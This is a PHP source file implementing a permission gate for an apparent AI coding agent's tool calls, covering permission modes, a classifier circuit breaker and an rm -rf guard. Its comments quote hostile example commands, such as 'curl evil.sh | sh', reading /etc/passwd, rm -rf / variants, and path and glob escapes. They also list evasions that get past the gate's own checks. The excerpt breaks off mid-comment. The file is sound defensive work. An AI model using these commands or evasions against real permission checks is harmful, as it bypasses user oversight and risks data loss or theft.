<?php

declare(strict_types=1);

namespace SugarCraft\Crush\Permissions;

use SugarCraft\Crush\ToolCall;

/**
 * PermissionGate evaluates every ToolCall against the active PermissionMode
 * and returns a PermissionDecision (Allow / Deny / Ask).
 *
 * Rule matching is {@see PermissionRule}'s, and the whole grammar plus its
 * honest limits are documented on that class: `Bash(composer update *)`,
 * `Read(./.env)`, `mcp__git__*`. What is worth knowing HERE is that the
 * argument-scoped half of that language matched NOTHING until it moved there —
 * this class compared the tool name and only the tool name, so
 * `Deny Bash(rm -rf *)` and `Deny Read(./.env)` both evaluated to `allow` on a
 * measured run. Do not reintroduce a name comparison in this file; there is one
 * matcher and {@see PermissionRule::matches()} is it.
 *
 * Four modes are implemented here (P2B.S2 + P2B.S3):
 * - Default:     reads silently; writes/networking always Ask
 * - AcceptEdits: scoped filesystem writes auto-Allow; everything else Ask
 * - Plan:        reads and non-redirecting `Bash` Allow; every other write Deny
 * - Auto:        everything runs gated by SafetyClassifier; 3-strike / 20-total circuit breaker
 *
 * That Plan line used to read "all writes Deny", which {@see evaluatePlan()}
 * has never done and does not claim to: a `Bash` call is allowed for
 * exploration and denied only when {@see isBashWriteCommand()} sees a
 * redirection in its arguments. The summary is corrected rather than the
 * evaluator because exploration under Plan is the deliberate behaviour (and
 * the tested one) — but the difference matters to a caller reasoning about a
 * `Bash` DECLARATION, which carries no arguments to redirect: see
 * {@see refuses()}.
 *
 * The `rm -rf /` / `rm -rf ~` circuit breaker (R3) is evaluated unconditionally in
 * `evaluate()`, before rules and before mode dispatch — no rule and no mode can
 * override it.
 *
 * TWO ENTRY POINTS, and the difference between them is state:
 * - {@see evaluate()} settles a real {@see ToolCall} and, in Auto, RECORDS the
 *   outcome in this instance's circuit-breaker counters.
 * - {@see refuses()} answers a {@see ToolDeclaration} — a name a definition
 *   claims it will use — and touches nothing. Read that method before adding
 *   any other read-only caller.
 *
 * Both go through the one private {@see decide()}, so no mode's policy exists
 * in two places; the Auto arm is the only branch between them.
 *
 * A THIRD KIND OF CALLER wants neither: it wants to DISPLAY the policy, not
 * apply it. {@see mode()}, {@see modeSource()}, {@see rules()} and
 * {@see autoBreaker()} are the doors for that, and they exist so nobody
 * reaches for {@see evaluate()} to find out what this gate would do. Doing
 * that under Auto does not ask a question, it answers one and then changes
 * the subject — see {@see autoBreaker()}.
 *
 * @see PermissionMode for the full set of modes
 */
final class PermissionGate
{
    /**
     * Filesystem primitive commands that AcceptEdits may auto-approve, via Bash,
     * when scoped to the working directory. Real tool calls route these through
     * Bash(command: "mkdir ..."); there is no dedicated "mkdir" tool at runtime.
     */
    private const SCOPED_WRITE_COMMANDS = ['mkdir', 'touch', 'mv', 'cp', 'rm', 'rmdir'];

    /**
     * Circuit-breaker thresholds for Auto mode.
     */
    private const STRIKE_THRESHOLD = 3;
    private const TOTAL_BLOCK_THRESHOLD = 20;

    // -------------------------------------------------------------------------
    // Auto-mode circuit breaker state
    // -------------------------------------------------------------------------
    private int $consecutiveBlocks = 0;
    private int $totalBlocks = 0;
    private ?string $lastBlockedCategory = null;

    public function __construct(
        private readonly PermissionMode $mode,
        /** @var PermissionRule[] */
        private readonly array $rules = [],
        private readonly ?SafetyClassifier $classifier = null,
        /**
         * How to NAME the place `$mode` came from, for a surface that reports
         * the policy back to the user — `--permission-mode`,
         * `$SUGARCRUSH_PERMISSION_MODE`, `permissionMode in /home/…/settings.json`.
         *
         * Carried ON THE GATE rather than looked up by the reporter, and that
         * is the whole point: {@see \SugarCraft\Crush\Cli\Bootstrap::permissionGate()}
         * resolves this precedence chain ONCE per launch and the files behind
         * it are editable while the session runs, so a reporter that
         * re-derived the source could name a layer that is not the one this
         * gate was actually built from. Null means nobody recorded it — every
         * embedder, most tests, and {@see \SugarCraft\Crush\Agents\AgentManager}'s
         * bare fallback — and a null is reported as "not recorded" rather than
         * guessed at.
         */
        private readonly ?string $modeSource = null,
    ) {}

    /**
     * Returns the permission mode this gate was configured with.
     */
    public function mode(): PermissionMode
    {
        return $this->mode;
    }

    /**
     * How the caller that built this gate named the source of {@see mode()},
     * or null when it did not say. See the constructor parameter.
     */
    public function modeSource(): ?string
    {
        return $this->modeSource;
    }

    /**
     * The rules this gate decides by, in the order {@see evaluateRules()}
     * tries them — FIRST MATCH WINS, so the order is part of the policy and
     * not an incidental array order.
     *
     * Exists so that a caller which wants to SHOW the policy does not have to
     * probe for it. Without this the only way to learn what a gate refuses was
     * to hand it tool calls and watch, and under {@see PermissionMode::Auto}
     * that is not a question — it is a state change: {@see evaluate()} records
     * every outcome in the circuit-breaker counters, so a read-only screen
     * built on it would reset the strike run it was drawing. Read-only
     * inspection needs a read-only door, and this is it.
     *
     * @return list<PermissionRule>
     */
    public function rules(): array
    {
        return array_values($this->rules);
    }

    /**
     * A snapshot of the {@see PermissionMode::Auto} circuit breaker: where the
     * strike run stands, and the thresholds it is measured against.
     *
     * READ-ONLY, for the same reason {@see rules()} is. {@see evaluate()} is
     * the only thing that moves these numbers and it must stay that way — a
     * `/permissions` screen that advanced the counters it was displaying would
     * be a safety state changed by looking at it.
     *
     * THE THRESHOLDS RIDE ALONG deliberately. They are private constants that
     * {@see evaluateAuto()} compares against, so a display that printed its
     * own "of 3" would be a second copy of the policy, free to disagree with
     * the enforced one the day a threshold moves. Handing back the same
     * constants the evaluator uses makes that disagreement impossible rather
     * than merely unlikely.
     *
     * @return array{consecutiveBlocks: int, totalBlocks: int, lastBlockedCategory: ?string, strikeThreshold: int, totalBlockThreshold: int}
     */
    public function autoBreaker(): array
    {
        return [
            'consecutiveBlocks' => $this->consecutiveBlocks,
            'totalBlocks' => $this->totalBlocks,
            'lastBlockedCategory' => $this->lastBlockedCategory,
            'strikeThreshold' => self::STRIKE_THRESHOLD,
            'totalBlockThreshold' => self::TOTAL_BLOCK_THRESHOLD,
        ];
    }

    /**
     * Evaluate a REAL tool call and return the permission decision for the
     * current mode.
     *
     * MUTATES in {@see PermissionMode::Auto}: the decision advances (or resets)
     * this instance's circuit-breaker counters, which is how a third
     * consecutive block of one category escalates to `Ask`. Never call this to
     * ask a hypothetical question — a call that did not really happen must not
     * move a counter a real one is judged by. {@see refuses()} is the read-only
     * question, and it takes a type this method will not accept so the two
     * cannot be mixed up at a call site.
     */
    public function evaluate(ToolCall $call): PermissionDecision
    {
        return $this->decide($call, commitAutoStrikes: true, argumentsKnown: true);
    }

    /**
     * Would this gate refuse a tool a definition merely DECLARES?
     *
     * The read-only half of this class, for a caller holding a declaration
     * rather than a call: a workflow stage's `tools: [Bash, Write]`, an agent
     * preset's allow-list — untrusted text naming capability the session's own
     * policy may refuse. Answers `true` only for {@see PermissionDecision::Deny};
     * an `Ask` is not a refusal, because settling one needs the blocking
     * permission prompt and a caller that cannot show one must not turn "would
     * have asked" into "no".
     *
     * DOES NOT MUTATE, and that is the whole reason it exists rather than
     * callers using {@see evaluate()} with a name-only {@see ToolCall}: doing
     * that in `Auto` reset the strike counter (see {@see ToolDeclaration} for
     * the measured sequence).
     *
     * Exactly what a declaration can and cannot be refused by, because an
     * over-claimed check is worse than an absent one:
     *
     * - Name-pattern rules DO apply, in every mode: an explicit
     *   `Deny Bash` / `Deny Bash*` / `Deny mcp__git__*` refuses the
     *   declaration. This is the ONLY refusal available under `Auto`.
     * - Argument-sensitive rules (`Bash(rm *)`) cannot match: a declaration has
     *   no arguments. Left to the call site that has them. TRUE BY
     *   CONSTRUCTION since the matcher moved to {@see PermissionRule}, which
     *   takes an explicit `$argumentsKnown` and is passed `false` from here —
     *   before that it was true only because no argument-scoped pattern matched
     *   anything at all, anywhere. {@see PermissionRule::matches()} carries the
     *   cost argument for choosing this over refusing the declaration.
     * - The `rm -rf /` breaker cannot fire either, for the same reason — it
     *   reads `arguments['command']`.
     * - `Plan` refuses `Edit`, `Write` and every `mcp__*` declaration, but NOT
     *   `Bash`: what makes a `Bash` call a write under Plan is a redirection in
     *   its arguments ({@see isBashWriteCommand()}), so a bare `Bash` name is
     *   allowed there exactly as an exploratory `git log` is.
     * - `DontAsk` refuses every declaration that is not a read-only tool.
     * - `Auto` refuses NOTHING through its mode evaluator, and this is
     *   structural rather than an oversight: Auto's judgement is
     *   {@see SafetyClassifier}'s, and the classifier reads
     *   `arguments['command']` — a name alone is never dangerous to it. A
     *   declaration under Auto is therefore only refusable by a Deny rule
     *   (above). Auto's real enforcement is per-call, at whichever layer runs
     *   the call, through {@see evaluate()}.
     * - `Default` / `AcceptEdits` refuse nothing (they `Ask`), and
     *   `BypassPermissions` refuses nothing by definition.
     */
    public function refuses(ToolDeclaration $declaration): bool
    {
        return $this->decide(
            $declaration->asNamedCallForGateOnly(),
            commitAutoStrikes: false,
            argumentsKnown: false,
        ) === PermissionDecision::Deny;
    }

    /**
     * The one copy of the decision path, shared by both entry points.
     *
     * Shared rather than duplicated because the alternative — a second
     * "read-only" evaluator with its own mode table — is a policy that drifts
     * from the enforced one silently, and a security check that no longer
     * matches the thing it claims to predict is worse than no check.
     *
     * @param bool $commitAutoStrikes Whether an Auto-mode outcome may be
     *        recorded in the circuit-breaker counters. TRUE only for a real
     *        call: {@see evaluate()} passes true, {@see refuses()} passes
     *        false.
     * @param bool $argumentsKnown Whether `$call`'s arguments are the real
     *        ones. FALSE only for the {@see refuses()} path, whose `$call` is a
     *        name synthesised from a {@see ToolDeclaration} — arguments that are
     *        not absent but UNKNOWABLE, and the two have to be told apart
     *        because {@see PermissionRule::matches()} fails CLOSED on an absent
     *        subject and must not do so on an unknowable one. Both flags carry
     *        the same distinction (real call vs. hypothetical) into different
     *        subsystems, which is why they are separate parameters rather than
     *        one: an Auto strike is about STATE, this is about EVIDENCE.
     */
    private function decide(ToolCall $call, bool $commitAutoStrikes, bool $argumentsKnown): PermissionDecision
    {
        // 0. Circuit breaker: `rm -rf /` / `rm -rf ~` is refused unconditionally,
        // in every mode, before rules are considered — no Allow rule and no mode
        // (including BypassPermissions) can talk this gate into a self-destruct.
        if ($this->isRmRfRootOrHome($call)) {
            return PermissionDecision::Deny;
        }

        // 1. Check explicit rules first (highest priority)
        $ruleDecision = $this->evaluateRules($call, $argumentsKnown);
        if ($ruleDecision !== null) {
            return $ruleDecision;
        }

        // 2. Mode-specific logic
        return match ($this->mode) {
            PermissionMode::Default => $this->evaluateDefault($call),
            PermissionMode::AcceptEdits => $this->evaluateAcceptEdits($call),
            PermissionMode::Plan => $this->evaluatePlan($call),
            PermissionMode::Auto => $commitAutoStrikes
                ? $this->evaluateAuto($call)
                : $this->autoDeclarationDecision(),
            // P2B.S4: DontAsk and BypassPermissions have dedicated evaluators
            PermissionMode::DontAsk => $this->evaluateDontAsk($call),
            PermissionMode::BypassPermissions => $this->evaluateBypassPermissions($call),
        };
    }

    /**
     * Check rules in order; first match wins.
     *
     * @param bool $argumentsKnown threaded straight through to
     *        {@see PermissionRule::matches()} — see {@see decide()} for why the
     *        two entry points differ on it.
     */
    private function evaluateRules(ToolCall $call, bool $argumentsKnown): ?PermissionDecision
    {
        foreach ($this->rules as $rule) {
            if ($rule->matches($call, $argumentsKnown)) {
                return $this->actionToDecision($rule->action);
            }
        }
        return null;
    }

    private function actionToDecision(PermissionAction $action): PermissionDecision
    {
        return match ($action) {
            PermissionAction::Allow => PermissionDecision::Allow,
            PermissionAction::Deny => PermissionDecision::Deny,
            PermissionAction::Ask => PermissionDecision::Ask,
        };
    }

    // -------------------------------------------------------------------------
    // Mode evaluators
    // -------------------------------------------------------------------------

    /**
     * Default: reads are silent, everything else prompts.
     */
    private function evaluateDefault(ToolCall $call): PermissionDecision
    {
        if ($this->isReadOnlyTool($call)) {
            return PermissionDecision::Allow;
        }
        return PermissionDecision::Ask;
    }

    /**
     * AcceptEdits: scoped filesystem writes auto-approve; protected paths still prompt.
     */
    private function evaluateAcceptEdits(ToolCall $call): PermissionDecision
    {
        // Reads always allow in AcceptEdits
        if ($this->isReadOnlyTool($call)) {
            return PermissionDecision::Allow;
        }

        // Scoped filesystem writes (mkdir, touch, mv, cp, rm, rmdir) auto-allow
        if ($this->isScopedWriteTool($call)) {
            return PermissionDecision::Allow;
        }

        // Everything else (network, shell commands, non-scoped writes) asks
        return PermissionDecision::Ask;
    }

    /**
     * Auto: everything runs gated by SafetyClassifier; circuit breaker triggers Ask after
     * 3 consecutive blocks of the same category OR 20 total blocks in the session.
     *
     * The ONLY stateful evaluator in this class, and the reason
     * {@see refuses()} exists: every outcome here is recorded, including the
     * safe one, which resets `$consecutiveBlocks`. That reset is correct for a
     * real call (a safe command genuinely breaks a run of blocked ones) and
     * corrupting for a hypothetical one — hence {@see autoDeclarationDecision()}.
     *
     * @see SafetyClassifier for the 13 dangerous-action categories.
     */
    private function evaluateAuto(ToolCall $call): PermissionDecision
    {
        // SafetyClassifier is the gatekeeper for Auto mode. Fail CLOSED when it's
        // missing — a misconfigured gate must never silently become "allow everything";
        // that would turn a config bug into a security hole. Ask instead of Allow.
        if ($this->classifier === null) {
            return PermissionDecision::Ask;
        }

        $category = $this->classifier->classify($call);

        // Action is safe — reset counters and allow
        if ($category === null) {
            $this->consecutiveBlocks = 0;
            $this->lastBlockedCategory = null;
            return PermissionDecision::Allow;
        }

        // Dangerous action blocked — update circuit breaker state
        if ($category === $this->lastBlockedCategory) {
            ++$this->consecutiveBlocks;
        } else {
            $this->consecutiveBlocks = 1;
            $this->lastBlockedCategory = $category;
        }
        ++$this->totalBlocks;

        // Circuit breaker thresholds
        if ($this->consecutiveBlocks >= self::STRIKE_THRESHOLD) {
            return PermissionDecision::Ask;
        }
        if ($this->totalBlocks >= self::TOTAL_BLOCK_THRESHOLD) {
            return PermissionDecision::Ask;
        }

        return PermissionDecision::Deny;
    }

    /**
     * Auto's answer for a {@see ToolDeclaration} — the one call path that must
     * leave the circuit-breaker counters exactly as it found them.
     *
     * Takes no {@see ToolCall} on purpose. A declaration carries no arguments,
     * and {@see SafetyClassifier::classify()} reads `arguments['command']`, so
     * the classifier returns null for every possible declaration — running it
     * would be theatre, and reproducing {@see evaluateAuto()}'s counter
     * arithmetic below a category that cannot occur would be unreachable code
     * dressed as rigour. Auto's declaration policy is the single statement
     * below, and {@see refuses()} says so where a caller will read it: under
     * Auto only an explicit Deny RULE (matched before this method, in
     * {@see decide()}) refuses a declaration.
     *
     * Fail-closed parity with {@see evaluateAuto()} is kept for the
     * missing-classifier case even though `refuses()` treats Ask and Allow
     * alike, so that a misconfigured Auto gate never reads as a confident
     * "allow" from either entry point.
     */
    private function autoDeclarationDecision(): PermissionDecision
    {
        if ($this->classifier === null) {
            return PermissionDecision::Ask;
        }

        return PermissionDecision::Allow;
    }

    /**
     * Plan: reads/shell exploration freely, but no edits land until approved.
     */
    private function evaluatePlan(ToolCall $call): PermissionDecision
    {
        // Reads are always allowed in Plan mode
        if ($this->isReadOnlyTool($call)) {
            return PermissionDecision::Allow;
        }

        // Bash commands are allowed for exploration (e.g. git log, find, grep)
        // but denied when they redirect output (writing to files)
        if ($call->name === 'Bash') {
            if ($this->isBashWriteCommand($call)) {
                return PermissionDecision::Deny;
            }
            return PermissionDecision::Allow;
        }

        // All other writes are denied in Plan mode — nothing edits until the plan is approved
        if ($this->isWriteTool($call)) {
            return PermissionDecision::Deny;
        }

        // Default: ask
        return PermissionDecision::Ask;
    }

    /**
     * DontAsk: auto-denies anything not pre-approved. Read-only tools (Read/Grep/Glob/WebFetch)
     * are implicitly allowed without an explicit rule. Hook-approved calls would also be allowed
     * via the hook system, but in practice: no explicit Allow rule + non-read-only tool → Deny.
     *
     * Explicit rules always take priority — if a rule matches, its action wins.
     * (The rules check happens before this method is called in evaluate().)
     */
    private function evaluateDontAsk(ToolCall $call): PermissionDecision
    {
        // Read-only tools are implicitly allowed in DontAsk mode
        if ($this->isReadOnlyTool($call)) {
            return PermissionDecision::Allow;
        }

        // Everything else (not read-only and no explicit rule) is denied
        return PermissionDecision::Deny;
    }

    /**
     * BypassPermissions: allows everything EXCEPT explicit Deny rules. The `rm -rf /`
     * / `rm -rf ~` circuit breaker no longer lives here — it's evaluated unconditionally
     * in evaluate() before this method (or any rule) ever runs.
     *
     * Explicit rules always take priority — if a rule matches, its action wins.
     * (The rules check happens before this method is called in evaluate().)
     */
    private function evaluateBypassPermissions(ToolCall $call): PermissionDecision
    {
        // Everything else is allowed in BypassPermissions mode
        return PermissionDecision::Allow;
    }

    /**
     * Detect the `rm -rf /` or `rm -rf ~` circuit-breaker pattern (R3).
     *
     * Deliberately tolerant of evasion via flag reordering (`-fr`), flag splitting
     * (`-r -f`), long-form flags (`--recursive --force`), `--no-preserve-root`
     * riding along, and the target being wrapped in matching quotes (`"/"`, `'~'`)
     * — a quoted path is a routine shell habit, not an unusual evasion, and the
     * literal token comparison must see through it. Case-insensitive; handles
     * prefixes like `sudo`. Command chains are checked segment-by-segment, and
     * the separator class is `[;&|\r\n]+` rather than `[;&|]+`: a NEWLINE
     * separates two commands exactly as `;` does, and while it lacked one this
     * breaker — the mode-independent one, the one nothing can switch off —
     * allowed `echo hi\nrm -rf /` under `bypass-permissions` while denying
     * `echo hi && rm -rf /`. Measured, not reasoned.
     *
     * BE CLEAR ABOUT WHAT THIS IS NOT. Mode-independence makes it unswitchable,
     * not unevadable: it reads `arguments['command']` and tokenises it, so it is
     * shell-text matching with the same ceiling {@see PermissionRule}'s
     * "HONEST LIMITS" block documents — `/bin/rm -rf /`, `$(echo rm) -rf /` and
     * `bash -c 'rm -rf /'` are all past it. It is a guard rail against an
     * accident, and calling it a containment boundary (as a first draft of that
     * block did) would be exactly the overclaim that block exists to refuse.
     *
     * Matches: rm -rf /, rm -fr /, rm -r -f /, rm --recursive --force /,
     * rm -rf --no-preserve-root /, rm -rf "/", rm -rf '/', rm -rf ~,
     * sudo rm -rf /, SUDO RM -RF ~
     */
    private function isRmRfRootOrHome(ToolCall $call): bool
    {
        // Only applies to Bash tool calls
        if ($call->name !== 'Bash') {
            return false;
        }

        $args = $call->arguments;
        if (!isset($args['command']) || !is_string($args['command'])) {
            return false;
        }

        foreach (preg_split('/[;&|\r\n]+/', $args['command']) as $segment) {
            if ($this->segmentIsRmRfRootOrHome($segment)) {
                return true;
            }
        }

        return false;
    }

    /**
     * Tokenize a single shell command segment and ask: is this an `rm` invocation
     * that combines recursive + force flags (in any spelling/order/split) against
     * a `/` or `~` target?
     */
    private function segmentIsRmRfRootOrHome(string $segment): bool
    {
        $tokens = array_values(array_filter(
            preg_split('/\s+/', trim($segment)) ?: [],
            static fn (string $t): bool => $t !== '',
        ));
        if ($tokens === []) {
            return false;
        }

        $i = 0;
        $count = count($tokens);

        // Skip leading prefixes like `sudo` (case-insensitive).
        while ($i < $count && strtolower($tokens[$i]) === 'sudo') {
            ++$i;
        }

        if ($i >= $count || strtolower($tokens[$i]) !== 'rm') {
            return false;
        }
        ++$i;

        $recursive = false;
        $force = false;
        $target = null;

        for (; $i < $count; ++$i) {
            $token = $tokens[$i];
            $lower = strtolower($token);

            if ($lower === '--recursive') {
                $recursive = true;
                continue;
            }
            if ($lower === '--force') {
                $force = true;
                continue;
            }
            if ($lower === '--no-preserve-root' || $lower === '--') {
                // Modifier flags that don't affect the recursive/force determination.
                continue;
            }
            if (str_starts_with($token, '--')) {
                // Unrecognized long flag — ignore, don't treat as the target.
                continue;
            }
            if ($token !== '-' && str_starts_with($token, '-')) {
                // Short flag cluster, e.g. -rf, -fr, -r, -f, -Rf (case-insensitive).
                $flags = strtolower(substr($token, 1));
                if (str_contains($flags, 'r')) {
                    $recursive = true;
                }
                if (str_contains($flags, 'f')) {
                    $force = true;
                }
                continue;
            }

            // First non-flag token is the target path.
            $target = $token;
            break;
        }

        if (!$recursive || !$force || $target === null) {
            return false;
        }

        $target = $this->stripMatchingQuotes($target);

        return $target === '/' || $target === '~';
    }

    /**
     * Strip a single pair of matching surrounding quotes (`"/"` -> `/`, `'~'` -> `~`)
     * so a quoted target can't evade the literal token comparison — a quoted path is
     * a routine shell habit, not an unusual evasion.
     */
    private function stripMatchingQuotes(string $token): string
    {
        $length = strlen($token);
        if ($length >= 2) {
            $first = $token[0];
            $last = $token[$length - 1];
            if (($first === '"' || $first === "'") && $first === $last) {
                return substr($token, 1, -1);
            }
        }

        return $token;
    }

    // -------------------------------------------------------------------------
    // Tool classifiers
    // -------------------------------------------------------------------------

    /**
     * The built-in tools this gate treats as read-only: `Read`, `Grep`, `Glob`,
     * `WebFetch`, `Lsp`. `Find` was never a real tool name.
     *
     * A DECISION, NOT A CENSUS OF `src/Tools/BuiltIn/`, and the earlier wording
     * here ("Read-only built-in tools (@see src/Tools/BuiltIn/): …") claimed to be
     * the latter — a list whose stated domain was a directory, while three tools
     * in that directory that mutate nothing were absent from it. `WebSearch`,
     * `Skill` and `doctor` are deliberately still absent: each reaches something
     * outside this process (a search endpoint, a skill body that may carry
     * `allowed-tools`, a capability probe), so leaving them to Ask costs a prompt
     * while listing them would spend a judgement this class cannot make.
     *
     * `Lsp` IS here, and the reason is specific to it rather than inherited: its
     * whole `operation` domain is queries — definition, references, hover,
     * symbols, codeActions, diagnostics — and the mutating half of LSP (rename,
     * formatting, APPLYING a code action's edit) is absent from that tool by
     * construction. `codeActions` RETURNS proposed edits and nothing applies one;
     * an edit still has to come back through `Edit`/`Write`, which are
     * {@see isWriteTool()}. Without this entry, Plan mode — the mode whose entire
     * purpose is reading a codebase before touching it — asked before every
     * go-to-definition, and DontAsk denied it outright.
     */
    private function isReadOnlyTool(ToolCall $call): bool
    {
        return in_array($call->name, ['Read', 'Grep', 'Glob', 'WebFetch', 'Lsp'], true);
    }

    /**
     * Write-capable tools: `Edit`/`Write` mutate files directly, `Bash` can do
     * anything a shell can, and MCP tools follow the `mcp__<server>__<tool>`
     * naming convention (@see PermissionRule) — their capability is
     * server-defined and unknowable here, so they're treated conservatively as
     * writes. `McpTool` was never a real tool name.
     *
     * `Write` is named even though nothing dispatched under that name for most
     * of this lib's life, because the cost of the two mistakes is not
     * symmetric: a name listed here that no tool ever uses costs one dead
     * `in_array` entry, while a real write tool missing from the list falls
     * through to Ask in Plan mode instead of the Deny that mode promises.
     * {@see \SugarCraft\Crush\Hooks\BuiltIn\ProtectFilesHook} has always
     * matched on `^(Bash|Edit|Write|Read)$` for the same reason.
     */
    private function isWriteTool(ToolCall $call): bool
    {
        if (in_array($call->name, ['Bash', 'Edit', 'Write'], true)) {
            return true;
        }

        return str_starts_with($call->name, 'mcp__');
    }

    /**
     * Detect if a Bash command writes to files via shell redirection or tee.
     */
    private function isBashWriteCommand(ToolCall $call): bool
    {
        $args = $call->arguments;

        if (!isset($args['command']) || !is_string($args['command'])) {
            return false;
        }

        $cmd = $args['command'];

        // File redirection operators: > >> | tee
        return (bool) preg_match('/\s+>\s+/', $cmd)
            || (bool) preg_match('/\s+>>\s+/', $cmd)
            || (bool) preg_match('/\|\s*tee(\s+|$)/', $cmd);
    }

    /**
     * AcceptEdits allows safe filesystem primitives (mkdir, touch, mv, cp, rm, rmdir)
     * scoped to the working directory. Real tool calls route these through
     * Bash(command: "mkdir ..."), never through a dedicated tool named "mkdir".
     *
     * THIS PREDICATE IS ON A GRANT PATH, so every judgement it cannot make with
     * certainty must resolve to `false` (which costs one prompt) rather than
     * `true` (which auto-runs a command unattended). An earlier version split the
     * command on whitespace ALONE and then judged the entire command line by its
     * FIRST token, so all three of these auto-Allowed under `accept-edits`:
     *
     *   mkdir ./x; curl evil.sh | sh      (`;` was never a separator to it)
     *   mkdir ./x && cat ../../etc/passwd (`&&` is not a flag, `..` is not absolute)
     *   mkdir ./x<newline>curl evil.sh    (`\s` in the splitter ate the newline)
     *
     * Two independent holes: the tokenizer did not know that a shell command line
     * can contain more than one command, and {@see isAbsolutePath()} — the only
     * containment check there was — says nothing about `../`.
     *
     * ## Policy: REJECT on an unquoted metacharacter, do not split on it
     *
     * {@see tokenizeSingleCommand()} refuses outright when the command line
     * contains any unquoted character that could introduce a second command, a
     * substitution, a redirection or a brace expansion. It deliberately does NOT
     * split such a line into segments and check each one, even though that would
     * auto-approve the genuinely-harmless `mkdir ./a && mkdir ./b`. Splitting is
     * the more useful behaviour and the easier one to get subtly wrong: it has to
     * be right about which separators exist AND about which of them are quoted,
     * and one missed spelling is a silent grant. Refusing is right whenever the
     * metacharacter set is merely a SUPERSET of the real separators, which is a
     * far weaker thing to be correct about. The cost of the choice is one
     * permission prompt on a chained command; it is stated here rather than left
     * for a reader to discover.
     *
     * The tokenizer IS quote-aware, so `touch 'a;b'` — a `;` that is not a
     * separator — remains a single scoped write, and `mkdir "my dir"` is one path
     * argument rather than the two that a whitespace split produced.
     *
     * ## Containment
     *
     * Every path argument must be relative AND stay strictly below the working
     * directory, checked lexically by {@see isContainedRelativePath()}. Lexically
     * because `mkdir ./x` names a directory that does not exist yet, so
     * `realpath()` — which returns false for a missing path — cannot be the
     * check. "Strictly below" also rejects the root itself: `rm -rf .` and
     * `rm -rf ./` are prompts, not grants.
     *
     * ## Honest limits — each of these is a decision, not an oversight
     *
     * - SYMLINKS ARE NOT RESOLVED. `rm ./link-that-points-outside` is spelled as a
     *   contained relative path and is treated as one. Resolving it would mean
     *   touching the filesystem, which this class does not do, and would still be
     *   a TOCTOU race against the command it is approving. Callers wanting real
     *   containment need it enforced where the command runs, not here.
     * - GLOBS ARE NOT EXPANDED. `rm ./*` is judged as the literal token `./*`.
     *   A glob cannot introduce a command and cannot escape the directory it is
     *   anchored in, but `{a,b}` brace expansion CAN (`{.,..}/x`), which is why
     *   `{`/`}` are in the rejected metacharacter set and `*`/`?`/`[` are not.
     *
     *   THE SECOND HALF OF THAT SENTENCE IS TRUE ONLY UNDER BASH, and this
     *   class cannot see the reason. "A glob cannot escape the directory it is
     *   anchored in" is a property of the SHELL, not of the pattern: bash
     *   excludes `.` and `..` from glob results, so `./.<star>/` stays literal.
     *   Dash does not. MEASURED under `/bin/sh`, `./.<star>/` expands to
     *   `./../`, which turns the auto-Allowed `cp ./payload ./.<star>/victim`
     *   into a real write — and a real delete — one directory above the
     *   working directory.
     *
     *   What makes the omission safe is that
     *   {@see \SugarCraft\Crush\Tools\BuiltIn\Bash} spawns every approved
     *   command through `bash -c`. That is a constant in a DIFFERENT file,
     *   which this class neither references nor depends on, and nothing in the
     *   type system connects them. **If that wrapper ever becomes `sh -c`,
     *   leaving `*` out of {@see SHELL_METACHARS} becomes a live grant escape**
     *   and `*`/`?`/`[` must be added to the set.
     *
     *   `PermissionGateScopedWriteTest::testTheBashToolStillSpawnsThroughBashNotSh()`
     *   is the tripwire for that change. It is a source-string assertion, so it
     *   catches an edit to the wrapper, not a host where `bash` is really dash.
     * - The command word is compared CASE-SENSITIVELY, unlike
     *   {@see segmentIsRmRfRootOrHome()}, which lowercases. The asymmetry is the
     *   point: lowercasing widens a DENY list (safe) and widens an ALLOW list
     *   (not safe). `MKDIR ./x` used to auto-Allow here — on a case-sensitive
     *   filesystem that is not `mkdir` at all but whatever `MKDIR` resolves to.
     * - A command spelled with a path or a prefix (`/bin/mkdir`, `./mkdir`,
     *   `sudo mkdir`, `env mkdir`) is not in {@see SCOPED_WRITE_COMMANDS} and so
     *   prompts. That was already true and is kept deliberately.
     */
    private function isScopedWriteTool(ToolCall $call): bool
    {
        if ($call->name !== 'Bash') {
            return false;
        }

        $args = $call->arguments;
        if (!isset($args['command']) || !is_string($args['command'])) {
            return false;
        }

        $tokens = $this->tokenizeSingleCommand($args['command']);
        if ($tokens === null || $tokens === []) {
            return false;
        }

        // Case-sensitive on purpose — see the "honest limits" block above.
        $command = array_shift($tokens);
        if (!in_array($command, self::SCOPED_WRITE_COMMANDS, true)) {
            return false;
        }

        $paths = [];
        $endOfOptions = false;

        foreach ($tokens as $token) {
            if (!$endOfOptions && $token === '--') {
                $endOfOptions = true;
                continue;
            }

            // A bare `-` is a filename, not a flag — the same call this file's
            // `rm -rf` breaker already makes in segmentIsRmRfRootOrHome().
            if (!$endOfOptions && $token !== '-' && str_starts_with($token, '-')) {
                if (!$this->isPermittedScopedWriteFlag($token)) {
                    return false;
                }
                continue;
            }

            $paths[] = $token;
        }

        if ($paths === []) {
            return false;
        }

        foreach ($paths as $path) {
            if (!$this->isContainedRelativePath($path)) {
                return false;
            }
        }

        return true;
    }

    /**
     * Characters that are refused when they appear OUTSIDE quotes: each can
     * introduce a second command (`| & ; newline`), a substitution (`$` and
     * backtick), a redirection (`< >`), a subshell (`( )`), a brace expansion
     * that can escape the directory (`{ }`), a history expansion (`!`), or an
     * escape that would desynchronise the quote scanner (`\`).
     */
    private const SHELL_METACHARS = "|&;<>()\$`\\{}!\n\r";

    /**
     * Characters still ACTIVE inside double quotes. Single quotes make everything
     * literal; double quotes do not, so `"$(id)"` and "`id`" have to be refused
     * even though they are quoted.
     */
    private const DOUBLE_QUOTE_ACTIVE_CHARS = "\$`\\";

    /**
     * Short flag letters accepted in a scoped write, as a cluster (`-rf`) or
     * singly (`-p`): parents, force, interactive, recursive (both spellings),
     * verbose, no-clobber, dir.
     *
     * A WHITELIST, because the alternative — "anything starting with `-` is a
     * flag, skip it" — silently skipped flags that TAKE A PATH: `mv -t ../../etc
     * ./x` passed the old containment loop because `-t` was skipped and
     * `../../etc` was merely non-absolute. An unlisted flag yields Ask, i.e. a
     * prompt, not a refusal of the operation.
     */
    private const SCOPED_WRITE_SHORT_FLAGS = 'pfirRvnd';

    /**
     * Long-flag spellings of the same set. `--target-directory` is deliberately
     * absent: it takes a path, and its `=`-attached form would hide that path
     * inside a token this loop treats as a flag.
     *
     * @var string[]
     */
    private const SCOPED_WRITE_LONG_FLAGS = [
        '--parents',
        '--recursive',
        '--force',
        '--verbose',
        '--interactive',
        '--no-clobber',
        '--dir',
    ];

    /**
     * Split a command line into words the way a shell would, but ONLY when the
     * line is unambiguously a single simple command.
